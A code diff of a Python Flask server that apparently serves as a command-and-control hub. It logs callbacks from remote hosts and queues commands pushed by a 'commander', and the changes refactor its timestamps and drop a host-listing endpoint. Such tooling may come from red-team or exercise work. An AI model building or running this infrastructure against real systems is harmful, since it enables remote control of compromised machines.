@@ -4,9 +4,8 @@ Process POST/GET requests from clients/commander, distribute commands and keep t
 """
 
 from flask import Flask, request
-from time import gmtime, strftime
-import os
 import datetime
+import os
 
 
 
@@ -17,12 +16,11 @@ all_hosts = set()
 
 @app.route('/api/callback/<host>/<typ>')
 def process_callbacks(host, typ):
-    
     ip = host.replace("-", ".")
     global all_hosts
     all_hosts.add(ip)
     src = typ
-    call_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
+    call_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     if os.path.isfile("/tmp/cc/calls.log"):
         with open("/tmp/cc/calls.log", 'a') as f:
@@ -43,10 +41,11 @@ def process_callbacks(host, typ):
 
 
 def log_action(hosts, cmds):
-    action_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
+    action_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_str = action_time + " : " + str(hosts) + " : " + cmds + "\n"
     with open("/tmp/cc/tasks.log", 'a') as f:
         f.write(log_str)
+
 
 @app.route('/api/commander/push', methods=['POST'])
 def proc_inc_coms():
@@ -69,29 +68,6 @@ def proc_inc_coms():
                 f.write(coms)
     return ""
 
-
-def parse(filename):
-    data = {}
-    for line in reversed(list(open(filename))):
-        date, time, ip, source = line.strip().split()
-        log_time = datetime.datetime.strptime(date +" "+time, '%Y-%m-%d %H:%M:%S')
-        diff = datetime.datetime.now() - log_time
-        if diff.seconds > 600:
-            break
-        if ip not in data:
-            data[ip] = set()
-        data[ip].add(source)
-    return data
-
-
-@app.route('/api/commander/show')
-def show_hosts():
-    host_str = ""
-    data = parse("/tmp/cc/calls.log")
-    for ip in data:
-        ln = "{}: {}".format(ip, data[ip]) + "\n"
-        host_str += ln
-    return host_str
 
 @app.route('/api/commander/calls')
 def show_call_log():
